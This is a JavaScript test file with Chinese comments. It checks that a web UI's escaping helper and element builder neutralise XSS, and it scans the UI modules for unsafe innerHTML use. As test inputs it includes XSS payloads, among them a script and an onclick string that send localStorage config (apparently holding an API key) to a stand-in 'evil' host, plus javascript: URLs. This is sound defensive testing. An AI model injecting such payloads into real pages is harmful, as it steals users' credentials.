import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, readdirSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { esc, el } from '../src/ui/dom.js'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..')

test('esc 转掉全部五个危险字符', () => {
  assert.equal(esc('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;')
  assert.equal(esc('a & b'), 'a &amp; b')
  assert.equal(esc(`"双引号"和'单引号'`), '&quot;双引号&quot;和&#39;单引号&#39;')
})

test('esc 对非字符串输入不炸', () => {
  assert.equal(esc(null), '')
  assert.equal(esc(undefined), '')
  assert.equal(esc(42), '42')
})

test('esc 后的串再也构不成标签', () => {
  const 恶意 = '<script>fetch("//evil/"+localStorage.aotai_config)</script>'
  const 安全 = esc(恶意)
  assert.ok(!安全.includes('<script'), '仍含可执行标签起始')
  assert.ok(!安全.includes('</script'), '仍含标签闭合')
})

// —— 这条是整个 UI 层的安全护栏 ——
test('src/ui 下没有任何模块把变量拼进 innerHTML', () => {
  const 违规 = []
  for (const f of readdirSync(join(ROOT, 'src/ui'))) {
    if (!f.endsWith('.js')) continue
    const 源码 = readFileSync(join(ROOT, 'src/ui', f), 'utf8')
    源码.split('\n').forEach((line, i) => {
      // 允许静态骨架：innerHTML = '...' 或 `...`（其中不含 ${}）
      if (!/innerHTML\s*(\+)?=/.test(line)) return
      // 立绘 SVG 是本地生成的静态字符串、不含任何外部输入，且 portrait.test.js
      // 已断言其中没有 <script 与 on*= ——这是唯一的例外，必须显式标注才放行
      if (line.includes('portrait-svg-safe')) return
      const 有插值 = /\$\{/.test(line)
      const 拼变量 = /innerHTML\s*(\+)?=\s*[^'"`]/.test(line)
      if (有插值 || 拼变量) 违规.push(`${f}:${i + 1}  ${line.trim()}`)
    })
  }
  assert.deepEqual(违规, [],
    `禁止把动态数据拼进 innerHTML（LLM 正文会上屏，key 就在同源 localStorage）：\n  ${违规.join('\n  ')}`)
})

// —— el 的属性通道：innerHTML 护栏扫不到这条路径 ——
function 假document() {
  return {
    createElement: () => ({
      className: '', textContent: '', attrs: {}, listeners: [],
      setAttribute(k, v) { this.attrs[k] = v },
      addEventListener(e, fn) { this.listeners.push([e, fn]) },
      appendChild() {},
    }),
    createTextNode: (t) => ({ text: t }),
  }
}

test('el 挡掉 javascript: URL', () => {
  globalThis.document = 假document()
  assert.throws(() => el('a', { href: 'javascript:alert(1)' }), /javascript:/)
  assert.throws(() => el('a', { href: '  JaVaScRiPt:alert(1)' }), /javascript:/, '大小写与前导空格也要挡')
  assert.throws(() => el('img', { src: 'javascript:x' }), /javascript:/)
  // 正常 URL 照常放行
  const a = el('a', { href: 'https://example.com' })
  assert.equal(a.attrs.href, 'https://example.com')
  delete globalThis.document
})

test('el 的 on* 只接函数，传字符串直接报错而不是变成内联处理器', () => {
  globalThis.document = 假document()
  assert.throws(() => el('div', { onclick: 'fetch("//evil/"+localStorage.aotai_config)' }), /只能接函数/)
  const d = el('div', { onclick: () => {} })
  assert.equal(d.listeners.length, 1)
  assert.equal(d.listeners[0][0], 'click')
  assert.equal(d.attrs.onclick, undefined, 'onclick 不该出现在属性里')
  delete globalThis.document
})
